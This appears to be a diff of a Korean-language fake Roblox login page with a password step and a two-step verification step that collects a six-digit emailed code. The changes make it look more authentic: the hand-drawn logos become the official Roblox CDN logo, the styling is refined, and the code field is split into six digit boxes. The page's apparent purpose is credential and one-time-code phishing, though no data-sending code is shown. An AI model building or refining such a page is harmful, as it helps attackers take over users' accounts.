@@ -10,39 +10,39 @@ body{font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',Roboto,'Helvetica N
 a{text-decoration:none}
 input{outline:none}
 .header{background:#101010;padding:12px 16px;display:flex;align-items:center;position:fixed;top:0;left:0;right:0;z-index:100}
-.header-left{display:flex;align-items:center;gap:8px}
 .header-logo{display:flex;align-items:center;gap:8px}
-.header-logo svg{height:32px;display:block}
+.header-logo img{height:32px;display:block}
+.header-logo span{color:#fff;font-size:22px;font-weight:800;letter-spacing:-0.5px}
 .main-content{flex:1;padding:80px 24px 40px;display:flex;flex-direction:column;align-items:center}
 .logo-section{text-align:center;margin:24px 0 28px}
-.logo-section .logo-svg{width:140px;height:34px;margin-bottom:12px}
+.logo-section .logo-img{width:80px;height:80px;margin-bottom:12px}
 .logo-section h1{font-size:28px;font-weight:800;color:#111}
 .login-card{width:100%;max-width:400px}
 .form-group{margin-bottom:20px}
 .form-group label{display:block;font-size:15px;font-weight:600;color:#111;margin-bottom:6px}
 .form-group input{width:100%;padding:14px 16px;border:1px solid #c8c8cd;border-radius:10px;font-size:16px;background:#fff;color:#111}
-.form-group input:focus{border-color:#007aff}
+.form-group input:focus{border-color:#007aff;box-shadow:0 0 0 3px rgba(0,122,255,0.1)}
 .form-group input::placeholder{color:#8e8e93}
-.login-btn{width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:12px;font-size:17px;font-weight:600;margin-top:4px;cursor:pointer}
-.login-btn:active{background:#0056b3}
+.login-btn{width:100%;padding:15px;background:#007aff;color:#fff;border:none;border-radius:30px;font-size:17px;font-weight:600;margin-top:4px;cursor:pointer;transition:opacity .15s}
+.login-btn:active{opacity:.8}
 .forgot-link{display:block;text-align:center;margin-top:16px;font-size:15px;color:#007aff;font-weight:500}
 .divider-wrap{display:flex;align-items:center;margin:24px 0;color:#8e8e93;font-size:13px}
 .divider-wrap::before,.divider-wrap::after{content:'';flex:1;height:1px;background:#c8c8cd}
 .divider-wrap span{padding:0 16px}
-.device-btn{width:100%;padding:14px;background:#fff;color:#007aff;border:1px solid #c8c8cd;border-radius:12px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px}
+.device-btn{width:100%;padding:14px;background:#fff;color:#007aff;border:1px solid #c8c8cd;border-radius:30px;font-size:15px;font-weight:600;cursor:pointer;display:flex;align-items:center;justify-content:center;gap:6px;transition:background .15s}
 .device-btn:active{background:#f2f2f7}
 .signup-text{text-align:center;margin-top:28px;font-size:15px;color:#555}
 .signup-text a{color:#007aff;font-weight:700}
 .error-msg{color:#d32f2f;font-size:13px;margin-top:12px;display:none;padding:10px 12px;background:#fef0ef;border-radius:10px;text-align:center}
 #step2fa{display:none}
 .fa-header{text-align:center;margin-bottom:28px}
-.fa-header .fa-svg{width:140px;height:34px;margin-bottom:16px}
+.fa-header .fa-img{width:80px;height:80px;margin-bottom:16px}
 .fa-header h2{font-size:22px;font-weight:700;color:#111;margin-bottom:12px}
 .fa-header p{font-size:15px;color:#333;line-height:1.6}
 .fa-header p .fa-email{font-weight:700;color:#111}
 .fa-input-wrap{display:flex;gap:8px;justify-content:center;margin:28px 0}
-.fa-input-wrap input{width:46px;height:54px;text-align:center;font-size:22px;font-weight:700;border:1px solid #c8c8cd;border-radius:10px;background:#fff;color:#111}
-.fa-input-wrap input:focus{border-color:#007aff}
+.fa-input-wrap input{width:46px;height:54px;text-align:center;font-size:22px;font-weight:700;border:1px solid #c8c8cd;border-radius:10px;background:#fff;color:#111;transition:border-color .15s}
+.fa-input-wrap input:focus{border-color:#007aff;box-shadow:0 0 0 3px rgba(0,122,255,0.1)}
 .fa-resend{text-align:center;font-size:14px;color:#555;margin-top:16px}
 .fa-resend a{color:#007aff;font-weight:500}
 .fa-error{color:#d32f2f;font-size:13px;margin-top:12px;display:none;padding:10px 12px;background:#fef0ef;border-radius:10px;text-align:center}
@@ -57,11 +57,8 @@ input{outline:none}
 
 <div class="header">
 <a class="header-logo">
-<svg class="header-logo-svg" viewBox="0 0 200 48" xmlns="http://www.w3.org/2000/svg">
-<rect x="0" y="6" width="36" height="36" rx="6" transform="rotate(20 0 6)" fill="none" stroke="#fff" stroke-width="3"/>
-<rect x="6" y="14" width="20" height="20" rx="3" transform="rotate(20 6 14)" fill="#bbb"/>
-<text x="48" y="32" font-family="Arial, sans-serif" font-size="28" font-weight="900" fill="#fff">Roblox</text>
-</svg>
+<img src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox Logo">
+<span>Roblox</span>
 </a>
 </div>
 
@@ -69,11 +66,7 @@ input{outline:none}
 
 <div id="step1">
 <div class="logo-section">
-<svg class="logo-svg" viewBox="0 0 200 48" xmlns="http://www.w3.org/2000/svg">
-<rect x="0" y="6" width="36" height="36" rx="6" transform="rotate(20 0 6)" fill="none" stroke="#111" stroke-width="3"/>
-<rect x="6" y="14" width="20" height="20" rx="3" transform="rotate(20 6 14)" fill="#aaa"/>
-<text x="48" y="32" font-family="Arial, sans-serif" font-size="28" font-weight="900" fill="#111">Roblox</text>
-</svg>
+<img class="logo-img" src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox Logo">
 <h1>Roblox</h1>
 </div>
 <div class="login-card">
@@ -92,18 +85,18 @@ input{outline:none}
 
 <div id="step2fa">
 <div class="fa-header">
-<svg class="fa-svg" viewBox="0 0 200 48" xmlns="http://www.w3.org/2000/svg">
-<rect x="0" y="6" width="36" height="36" rx="6" transform="rotate(20 0 6)" fill="none" stroke="#111" stroke-width="3"/>
-<rect x="6" y="14" width="20" height="20" rx="3" transform="rotate(20 6 14)" fill="#aaa"/>
-<text x="48" y="32" font-family="Arial, sans-serif" font-size="28" font-weight="900" fill="#111">Roblox</text>
-</svg>
+<img class="fa-img" src="https://cdn.foundation.roblox.com/current/StudioLogo.svg" alt="Roblox Logo">
 <h2>2단계 인증</h2>
 <p>귀하의 이메일 <span class="fa-email" id="faEmailDisplay"></span> 로 전송된 인증 코드를 입력하십시오</p>
 </div>
 <form id="faForm">
-<div class="form-group">
-<label for="faCode">인증 코드</label>
-<input type="text" id="faCode" placeholder="6자리 코드" maxlength="6" inputmode="numeric" required style="letter-spacing:8px;text-align:center;font-size:20px">
+<div class="fa-input-wrap">
+<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="0">
+<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="1">
+<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="2">
+<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="3">
+<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="4">
+<input type="text" maxlength="1" inputmode="numeric" class="fa-digit" data-index="5">
 </div>
 <button class="login-btn" type="submit">확인</button>
 <div class="fa-resend">코드를 받지 못하셨나요? <a href="#">다시 보내기</a></div>
@@ -124,7 +117,3 @@ input{outline:none}
 <li><a href="#">이용 약관</a></li>
 <li><a href="#">접근성</a></li>
 <li><a href="#">개인정보</a></li>
-<li><a href="#">설정</a></li>
-<li><a href="#">사이트 맵</a></li>
-</ul>
-<p class
